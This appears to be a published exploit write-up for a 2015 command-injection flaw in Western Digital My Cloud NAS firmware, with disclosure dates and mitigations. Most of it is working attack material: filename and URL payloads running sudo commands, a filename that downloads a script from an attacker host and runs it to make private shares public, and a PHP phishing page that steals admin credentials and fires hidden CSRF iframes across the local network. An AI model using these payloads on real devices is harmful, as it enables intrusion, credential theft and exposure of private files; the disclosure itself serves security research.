@@ -1,0 +1,113 @@
+# Exploit Title:     Western Digital My Cloud Command Injection
+# Vendor Homepage:   http://www.wdc.com
+# Firmware tested:   04.01.03-421 and 04.01.04-422 for the Personal Cloud devices
+# Firmware link:     http://download.wdc.com/nas/sq-040104-422-20150423.deb.zip
+# Exploit Author:    James Sibley (absane) ; twitter = @ab5ane
+# Blog post:         http://versprite.com/og/command-injection-in-the-wd-my-cloud-nas/
+# Discovery date:    May 10 2015
+# Vendor notified:   May 12 2015
+# Vendor fixed:      September 2015 with rolling updates
+# Vendor advisory:   http://community.wd.com/t5/My-Cloud/Potential-Security-Vulnerabilities-with-My-Cloud-Personal-Cloud/td-p/898578
+
+=======================
+| Overview            |
+=======================
+The function "exec_runtime", defined in /var/www/restapi/api/Core/init_autoloader.php, executes programs and scripts on the Linux-based WD My Cloud NAS through the PHP "exec" function. In many instances, user input makes its way into the "exec" function without proper validation and sanitization. Because of this, attackers can hijack the command flow and execute arbitrary commands in the context of the user www-data. The www-data user has unrestricted sudo access so escalating to root and therefore compromising the device is trivial.
+
+This was discovered in the "My Cloud Personal Cloud" device but other models may be affected.
+
+=======================
+| Proof of Concepts   |
+=======================
+There are two ways to show this:
+
+Method 1) Using the client application ("WD My Cloud Desktop") upload 2GB file with the following name: $(sudo shutdown -h now).txt
+
+Method 2) a) Authenticate as the administrator @ http://wdmycloud:80
+          b) Open the following path: /api/1.0/rest/safepoint_getstatus?handle=$(sudo shutdown -h now)&action=update
+
+In both PoCs, observe that the device powers off.
+
+=======================
+| Exploit 1           |
+=======================
+This exploit will make all private folders public. A video demo is in the blog.
+
+1) On a webserver host the following as index.html:
+	#!/bin/bash
+ 
+	while read share;
+	do
+		echo UPDATE UserShares SET public_access=\"true\" WHERE share_name=\"$share\"";" | sqlite3 /usr/local/nas/orion/orion.db;
+	done < <(bash /usr/local/sbin/getShares.sh private)
+	
+2) Upload a 2GB file to the WD My Cloud NAS with the client application ("WD My Cloud Desktop"). Use the following name:
+	$(sudo curl 192.168.0.226 -o makeAllPublic.sh && sudo bash makeAllPublic.sh).txt
+	
+3) After the file uploads, refresh the file list.
+
+=======================
+| Exploit 2           |
+=======================
+<!-- The following PHP script will utilize CSRF and WebRTC to remotely shutdown the My Cloud device.   -->
+<!-- Assumes zero knowledge of device's internal IP and current authentication state.                  -->
+<!-- Requires that the targeted user has admin rights and is on the same LAN as the My Cloud.          -->
+<!-- Source for the WebRTC JS code: https://dl.dropboxusercontent.com/u/1878671/enumhosts.html         -->
+<?php 
+if  (empty( $_GET['exploit'] ) ) {
+	echo "<html>";
+	echo "            <form id=\"login_form\" action=\"pwnmycloud.php\" method=\"get\">";
+	echo "                <p>Your WD My Cloud is damaged. Please login to fix this!</p>";
+	echo "                <div class=\"content_row\">";
+	echo "                    <label>Username</label>";
+	echo "                    <input class=\"NOTEMPTY\" id=\"login_username\" name=\"username\" value=\"\" type=\"text\">";
+	echo "                </div>";
+	echo "                <div class=\"content_row\">";
+	echo "                    <label>Password</label>";
+	echo "                    <input id=\"login_password\" name=\"password\" value=\"\" autocomplete=\"off\" type=\"password\">";
+	echo "                </div>";
+	echo "					<input id=\"exploit\" name=\"exploit\" value=\"true\" autocomplete=\"off\" type=\"hidden\">";
+	echo "        	<input type=\"submit\" value=\"Submit\">";
+	echo "            </form>";
+	echo "</html>";
+	die();
+} ?>
+<!doctype html><html><body onload = "go()"><script>
+
+<!-- Start compressed WebRTC code from https://dl.dropboxusercontent.com/u/1878671/enumhosts.html -->
+function TaskController(e,n){this.numConcurrent=e,this.onDone=n||function(){},this.pending=0,this.queued=[],this.checkTimer=-1}function probeIp(e,n,t){var i=Date.now(),o=!1,c=document.createElement("img"),r=function(){c&&(document.body.removeChild(c),c=null)},u=function(){o||(o=!0,r(),t(e,Date.now()-i<n))};document.body.appendChild(c),c.style.display="none",c.onload=function(){u(!0)},c.onerror=function(){u(!1)},c.src="https://"+e+":"+~~(1024+1024*Math.random())+"/I_DO_NOT_EXIST?"+Math.random(),setTimeout(function(){c&&(c.src="")},n+500)}function probeNet(e,n,t){e=e.replace(/(\d+\.\d+\.\d+)\.\d+/,"$1.");for(var i=5e3,o=new TaskController(5,t),c=1;256>c;++c)o.queue(function(t,o){probeIp(e+t,i,function(e,t){t&&n(e),o()})}.bind(this,c))}function enumLocalIPs(e){function n(n){n in o||(o[n]=!0,e(n))}function t(e){e.split("\r\n").forEach(function(e){if(~e.indexOf("a=candidate")){var t=e.split(" "),i=t[4],o=t[7];"host"===o&&n(i)}else if(~e.indexOf("c=")){var t=e.split(" "),i=t[2];n(i)}})}var i=window.webkitRTCPeerConnection||window.mozRTCPeerConnection;if(!i)return!1;var o=Object.create(null);o["0.0.0.0"]=!1;var c=new i({iceServers:[]});return c.createDataChannel("",{reliable:!1}),c.onicecandidate=function(e){e.candidate&&t("a="+e.candidate.candidate)},setTimeout(function(){c.createOffer(function(e){t(e.sdp),c.setLocalDescription(e)},function(){})},500),!0}function getIPs(e){new TaskController(1);enumLocalIPs(function(n){e(n)})}TaskController.prototype.deferCheck=function(){-1==this.checkTimer&&(this.checkTimer=setTimeout(function(){this.checkTimer=-1,this.check()}.bind(this),0))},TaskController.prototype.check=function(){if(this.pending<1&&0==this.queued.length)return this.onDone();for(;this.pending<this.numConcurrent&&this.queued.length>0;)try{this.pending+=1,setTimeout(function(e){e(function(){this.pending-=1,this.deferCheck()}.bind(this))}.bind(this,this.queued.shift()),0)}catch(e){this.pending-=1,this.deferCheck()}},TaskController.prototype.queue=function(e){this.queued.push(e),this.deferCheck()},document.write=function(e){var n=document.getElementsByTagName("script"),t=n[n.length-1];t.insertAdjacentHTML("beforebegin",e)};
+<!-- End compressed WebRTC code from https://dl.dropboxusercontent.com/u/1878671/enumhosts.html -->
+
+function exploit(ip) {
+    var ip_part = ip.split(".");
+    var cidr_24 = ip_part[0] + "." + ip_part[1] + "." + ip_part[2] + ".";
+    if (ip_part[0] == "192" || ip_part[0] == "172" || ip_part[0] == "10") {
+		var expFrame = new Array(255);
+		for (i = 2; i < 40; i++) {
+			document.write("<iframe id=\"" + i + "\" src=\"http://" + cidr_24 + i +"/api/2.1/rest/local_login?username=" + "<?php echo $_GET['username'] ?>" + "&password=" + "<?php echo $_GET['password'] ?>\" height=0 width=0 style=\"visibility:hidden;display:none\"></iframe>");			
+		};
+		for (i = 2; i < 40; i++) {
+			document.write("<iframe id=\"exp" + i + "\" src=\"http://" + cidr_24 + i + "/api/1.0/rest/safepoint_getstatus?handle=$(sudo shutdown -h now)&action=update\" height=0 width=0 style=\"visibility:hidden;display:none\"></iframe>");
+			setInterval( function(id) {document.getElementById(id).src = document.getElementById(id).src;}, 2000, "exp"+i );
+		};
+	};
+};
+
+function go() {
+    getIPs(function(ip) {
+        exploit(ip);
+    });
+}; </script></body></html>
+
+=======================
+| Mitigation          |
+=======================
+An update to the firmware has been released as of 9/28/15.
+
+Additional steps include:
+
+* Don't click on links from websites or people you don't know or trust ;)
+* Disable WebRTC in your browsers.
+* Restrict access to the My Cloud device to only trusted users that need access to it.
+* Disable remote access to the device if it is not used.
+* Avoid using the client application until a firmware update has been applied.
